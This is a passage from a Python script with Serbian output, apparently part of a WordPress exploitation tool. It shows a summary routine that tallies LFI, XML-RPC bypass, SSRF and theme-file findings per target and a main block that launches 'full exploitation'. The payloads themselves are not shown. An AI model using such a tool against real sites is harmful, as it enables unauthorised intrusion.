        print(f"\nüíæ Rezultati saƒçuvani u: {filename}")

    def print_summary(self, results):
        """Prikazuje sa≈æetak rezultata"""
        print("\n" + "="*60)
        print("üìä SA≈ΩETAK REZULTATA")
        print("="*60)
        
        total_lfi = 0
        total_xmlrpc = 0
        total_ssrf = 0
        total_theme = 0
        
        for target_url, data in results.items():
            lfi_count = len(data["lfi_mutations"])
            xmlrpc_count = len(data["xmlrpc_bypass"])
            ssrf_count = len(data["ssrf_wordpress"])
            theme_count = len(data["theme_exploits"])
            
            total_lfi += lfi_count
            total_xmlrpc += xmlrpc_count
            total_ssrf += ssrf_count
            total_theme += theme_count
            
            if lfi_count > 0 or xmlrpc_count > 0 or ssrf_count > 0 or theme_count > 0:
                print(f"\nüéØ {target_url}")
                if lfi_count > 0:
                    print(f"   üß™ LFI ranjivosti: {lfi_count}")
                if xmlrpc_count > 0:
                    print(f"   üîß XML-RPC bypass: {xmlrpc_count}")
                if ssrf_count > 0:
                    print(f"   üåê SSRF ranjivosti: {ssrf_count}")
                if theme_count > 0:
                    print(f"   üé® Dostupni tema fajlovi: {theme_count}")
        
        print(f"\nüìà UKUPNO:")
        print(f"   üß™ LFI ranjivosti: {total_lfi}")
        print(f"   üîß XML-RPC bypass: {total_xmlrpc}")
        print(f"   üåê SSRF ranjivosti: {total_ssrf}")
        print(f"   üé® Tema eksploiti: {total_theme}")
        
        if total_lfi > 0 or total_xmlrpc > 0 or total_ssrf > 0 or total_theme > 0:
            print(f"\nüéâ EKSPLOITACIJA USPE≈†NA! Pronaƒëeno ukupno {total_lfi + total_xmlrpc + total_ssrf + total_theme} ranjivosti!")
        else:
            print(f"\nüõ°Ô∏è  Svi target-i su dobro za≈°tiƒáeni.")

if __name__ == "__main__":
    # Pokreni eksploitaciju
    exploiter = WordPressAdvancedExploit()
    exploiter.run_full_exploitation()

